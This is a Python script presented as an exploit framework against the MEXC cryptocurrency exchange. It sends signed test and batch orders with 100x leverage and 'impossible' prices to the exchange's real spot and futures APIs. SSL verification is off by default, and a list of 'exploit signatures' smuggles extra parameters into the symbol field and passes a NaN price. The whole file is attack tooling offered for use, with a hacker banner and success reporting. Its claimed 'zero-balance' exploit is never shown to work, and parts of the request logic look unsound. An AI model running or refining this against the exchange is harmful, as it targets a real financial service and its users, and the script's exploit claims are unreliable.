#!/usr/bin/env python3
# MEXC Dual-Mode Zero-Balance Exploit Framework v10.1 (SSL Hardened)

import hmac
import hashlib
import requests
import time
import json
import warnings
from urllib.parse import urlencode

# Disable SSL warnings for clean output
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class MEXCDualExploit:
    def __init__(self, api_key, api_secret, verify_ssl=False):
        self.api_key = api_key
        self.api_secret = api_secret
        self.verify_ssl = verify_ssl
        self.endpoints = {
            'spot': {
                'base': 'https://api.mexc.com',
                'test_order': '/api/v3/order/test',
                'batch': '/api/v3/order/oco'
            },
            'futures': {
                'base': 'https://futures.mexc.com',
                'test_order': '/api/v1/private/order/test',
                'batch': '/api/v1/private/order/batch'
            }
        }
        self._session = requests.Session()
        self._session.verify = self.verify_ssl
        self._session.headers.update({
            'X-MEXC-APIKEY': self.api_key,
            'Content-Type': 'application/json',
            'User-Agent': 'MEXC-EXPLOIT-FRAMEWORK/10.1'
        })

    def _sign(self, params):
        """Enhanced signature generator with timestamp validation"""
        timestamp = int(time.time() * 1000)
        params['timestamp'] = timestamp
        query = urlencode(sorted(params.items()))
        return hmac.new(
            self.api_secret.encode(),
            query.encode(),
            hashlib.sha256
        ).hexdigest(), timestamp

    def _execute_attack(self, market_type, endpoint, params):
        """Robust request execution with error handling"""
        try:
            signature, timestamp = self._sign(params)
            params['signature'] = signature
            
            response = self._session.post(
                f"{self.endpoints[market_type]['base']}{endpoint}",
                data=json.dumps(params),
                timeout=15
            )
            
            return {
                'status': response.status_code,
                'response': response.json() if response.content else None,
                'timestamp': timestamp,
                'success': response.status_code == 200
            }
        except Exception as e:
            return {
                'error': str(e),
                'timestamp': int(time.time() * 1000),
                'success': False
            }

    def _test_order_attack(self, market_type, symbol):
        """Advanced test order attack"""
        params = {
            'symbol': symbol,
            'side': 'BUY',
            'type': 'MARKET',
            'quantity': 1,  # Minimum quantity
            'newOrderRespType': 'ACK',
            'test': True
        }
        
        if market_type == 'futures':
            params.update({
                'leverage': 100,  # Max leverage test
                'positionSide': 'BOTH'
            })
        
        return self._execute_attack(
            market_type,
            self.endpoints[market_type]['test_order'],
            params
        )

    def _batch_order_attack(self, market_type, symbol):
        """Bulk order exploit"""
        orders = [{
            'symbol': symbol,
            'side': 'BUY' if i % 2 == 0 else 'SELL',
            'type': 'LIMIT',
            'price': "83820",  # Impossible price
            'quantity': 0.01,
            'test': True
        } for i in range(5)]  # 5 alternating orders
        
        if market_type == 'futures':
            for order in orders:
                order.update({
                    'leverage': 100,
                    'positionSide': 'LONG' if order['side'] == 'BUY' else 'SHORT'
                })
        
        return self._execute_attack(
            market_type,
            self.endpoints[market_type]['batch'],
            {'batchOrders': json.dumps(orders)}
        )

    def execute_attacks(self, symbol):
        """Comprehensive dual-market attack"""
        results = {}
        
        for market in ['spot', 'futures']:
            results[market] = {
                'test_order': self._test_order_attack(market, symbol),
                'batch_attack': self._batch_order_attack(market, symbol),
                'timestamp': int(time.time() * 1000)
            }
        
        # Common exploit signatures
        results['common_vectors'] = [
            {"symbol": f"{symbol}?test=true&quantity=0.01"},
            {"side": "BUY", "type": "MARKET", "quantity": "0.01", "test": "true"},
            {"timeInForce": "GTX", "price": "NaN", "symbol": symbol}
        ]
        
        return results

if __name__ == "__main__":
    import argparse
    from pprint import pformat
    
    parser = argparse.ArgumentParser(description='MEXC Dual-Exploit v10.1')
    parser.add_argument('--api-key', required=True)
    parser.add_argument('--api-secret', required=True)
    parser.add_argument('--symbol', default='BTCUSDT')
    parser.add_argument('--verify-ssl', action='store_true')
    args = parser.parse_args()

    banner = """
    ███╗   ███╗███████╗██╗  ██╗ ██████╗    ██████╗ ██╗   ██╗ █████╗ ██╗     
    ████╗ ████║██╔════╝╚██╗██╔╝██╔════╝    ██╔══██╗██║   ██║██╔══██╗██║     
    ██╔████╔██║█████╗   ╚███╔╝ ██║  ███╗   ██║  ██║██║   ██║███████║██║     
    ██║╚██╔╝██║██╔══╝   ██╔██╗ ██║   ██║   ██║  ██║╚██╗ ██╔╝██╔══██║██║     
    ██║ ╚═╝ ██║███████╗██╔╝ ██╗╚██████╔╝   ██████╔╝ ╚████╔╝ ██║  ██║███████╗
    ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚══════╝
    DUAL-MODE ZERO-BALANCE EXPLOIT FRAMEWORK v10.1 (SSL Hardened)
    """
    print(banner)

    attacker = MEXCDualExploit(
        args.api_key,
        args.api_secret,
        verify_ssl=args.verify_ssl
    )
    results = attacker.execute_attacks(args.symbol)
    
    print("\n🔥 DUAL-MODE EXPLOIT RESULTS 🔥")
    print(pformat(results, width=100, indent=2))

    print("\n💀 EXPLOIT SUMMARY:")
    for market in ['spot', 'futures']:
        print(f"\n🔹 {market.upper()} MARKET:")
        for test in ['test_order', 'batch_attack']:
            res = results[market][test]
            status = "✅ SUCCESS" if res['success'] else f"❌ FAILED (HTTP {res.get('status', 'N/A')})"
            print(f"{status} - {test.replace('_', ' ').upper()}")
            if 'error' in res:
                print(f"    ERROR: {res['error']}")
